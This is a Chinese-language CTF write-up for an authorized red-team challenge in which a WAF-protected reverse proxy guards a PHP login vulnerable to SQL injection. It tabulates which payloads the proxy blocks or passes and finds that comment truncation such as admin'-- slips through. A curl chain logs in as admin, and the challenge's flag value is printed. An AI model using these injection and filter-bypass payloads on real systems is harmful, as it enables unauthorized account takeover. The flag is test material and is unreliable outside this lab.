## 题目原文

> 某业务系统在边界部署了带检测能力的反向代理过滤进入后端的请求，后端登录业务仍存在弱点。已获授权进行红队评估，设法让载荷穿过边界代理送达后端，获取仅管理员可见的受保护 flag。

## 题解

### 入口与指纹

登录页标题 `Login — Secure Portal`，`nginx/1.30.1`，PHP 会话。脚注是 `Protected by WAF with Chunked Encoding inspection`。表单字段仍是 `username` 和 `password`。

### 关键观察

后端同样把用户名拼进 SQL。这台代理拦布尔注入，不拦注释截断，而且比 e1-01 更松：末尾没有额外 token 的 `admin'--` 也能过。

| 用户名 | 结果 |
| --- | --- |
| `admin` | 200，口令错误 |
| `admin' or '1'='1` | 403 |
| `admin'--`、`admin'-- -`、`admin'/**/-- -` | 302 到 `dashboard.php` |
| `admin'#` | 200，口令错误 |

把布尔注入的正文改成 `Transfer-Encoding: chunked` 再送一次，仍然是 403。分块没有让这条已经被规则命中的语句通过。注释截断本身就不撞规则，不需要分块。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -c cj -b cj -D - -o /dev/null \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x" \
  "http://$T/"
curl -sS -b cj "http://$T/dashboard.php"
```

仪表盘标题 `Dashboard — Secure Portal`。本次平台接受的值是 `flag{e8cac776-ed86-4f33-a5d8-6ac57ea1258a}`。

### flag 位置

登录后的 `dashboard.php`。
